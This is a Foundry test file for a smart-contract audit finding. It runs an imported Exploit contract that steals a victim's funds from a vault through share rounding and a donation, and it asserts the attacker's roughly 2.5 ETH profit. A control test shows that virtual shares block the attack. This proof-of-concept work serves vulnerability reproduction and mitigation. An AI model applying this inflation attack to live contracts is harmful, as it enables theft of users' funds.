// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Exploit} from "./30578-h-4-victims-fund-can-be-stolen-due-to-rounding-error-and-exc.sol";

contract Finding30578Test is Test {
    function test_exploit_roundingAndDonationStealTwoAndAHalfEth() public {
        Exploit e = new Exploit();
        e.run();

        console.log("victim shares", e.victimShares());
        console.log("attacker WETH gain", e.attackerWethGain());
        console.log("attacker net", e.attackerNet());
        console.log("victim value", e.victimValue());
        console.log("victim shortfall", e.victimShortfall());

        assertEq(e.victimShares(), 1, "shares");
        assertEq(e.attackerWethGain(), 7499999999999999999, "weth gain");
        assertEq(e.attackerNet(), 2499999999999999999, "net");
        assertEq(e.victimShortfall(), 2499999999999999999, "shortfall");
        assertEq(e.weth().balanceOf(address(e)), 7500000000000000000, "attacker holds 7.5 WETH");
        assertEq(e.steth().balanceOf(address(e)), 0, "stETH spent");
    }

    function test_control_virtualShareRoundingDoesNotProfit() public {
        Exploit e = new Exploit();
        e.control();

        assertEq(e.weth().balanceOf(address(e)), 3750000000000000000, "control out");
        assertLt(e.weth().balanceOf(address(e)), 5 ether, "no profit vs 5 stETH");
        uint256 victimValue = e.weth().balanceOf(address(e.victim())) + e.steth().balanceOf(address(e.victim()));
        assertGe(victimValue, 10 ether, "victim not short");
        assertEq(victimValue, 11250000000000000001, "victim value");
    }
}
